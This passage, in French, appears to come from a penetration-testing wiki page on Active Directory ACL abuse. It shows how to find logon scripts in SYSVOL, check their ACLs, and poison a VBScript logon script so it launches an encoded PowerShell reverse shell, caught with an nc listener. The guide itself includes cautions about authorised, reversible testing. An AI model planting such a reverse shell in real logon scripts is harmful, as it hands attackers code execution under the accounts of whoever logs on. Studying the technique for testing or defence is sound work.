lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound affiche l’attribut de script de connexion `scriptPath` de l’objet utilisateur lorsqu’il est défini. Les scripts de connexion configurés par GPO constituent une référence de stratégie distincte ; inspectez donc également la GPO applicable.

### Vérifier les droits d’écriture (ne pas se fier aux listes de partages)
Les outils automatisés peuvent indiquer que SYSVOL/NETLOGON est en lecture seule, même si l’ACL NTFS du script concerné est différente. Commencez par inspecter en lecture seule ce fichier et son répertoire parent ; les ACE Allow correspondantes restent des candidates, car les droits effectifs SMB et NTFS, les ACE Deny et le jeton actuel sont tous à prendre en compte :

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

Un test d’écriture autorisé doit être spécifique à la cible et réversible, avec une sauvegarde du script d’origine qui sera restaurée. Ne remplacez pas un script de connexion fonctionnel simplement pour tester l’accès ; une écriture réussie peut s’exécuter lors de la prochaine ouverture de session d’un utilisateur.

### Empoisonner un script de connexion VBScript pour obtenir du RCE
Ajoutez une commande qui lance un reverse shell PowerShell (générez-le sur revshells.com) et conservez la logique d’origine pour éviter de perturber les fonctions métier :

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Mettez-vous à l’écoute sur votre hôte et attendez la prochaine ouverture de session interactive :

```bash
rlwrap -cAr nc -lnvp 443
```

Notes :
- L’exécution s’effectue avec le jeton de l’utilisateur de journalisation (pas SYSTEM). La portée correspond à la liaison GPO (OU, site, domaine) qui applique ce script.
- Après utilisation, restaurez le contenu et les horodatages d’origine.

## References

- [1] [Abus des ACL/ACE Active Directory](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Comptes privilégiés et privilèges de jeton](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Mise à jour du chemin d’attaque ACL](https://wald0.com/?p=112)
- [4] [Enum ActiveDirectoryRights - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Élévation de privilèges avec des ACL dans Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Recherche des privilèges Active Directory et des comptes privilégiés](https://adsecurity.org/?p=3658)
- [7] [Constructeur ActiveDirectoryAccessRule - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – opérations sur les attributs/UAC AD depuis Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (appartenance à un groupe)](https://www.samba.org/)
- [10] [HTB Puppy : abus des ACL AD, cracking Argon2 de KeePassXC et déchiffrement DPAPI jusqu’à l’administration du DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out : détournement des chemins UNC GPO pour l’exécution de code et le relais NTLM](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity : exploitation des GPO Active Directory via le relais NTLM, et plus encore](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [Une OU qui se marre ? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py : exploitation des vecteurs d’attaque ACL des unités organisationnelles cachées dans Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Simulation de services Active Directory légitimes sur le réseau : le cas de l’exploitation de GPO](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
- [18] [HTB : Hercules — déplacement entre OU et abus des ACL héritées](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
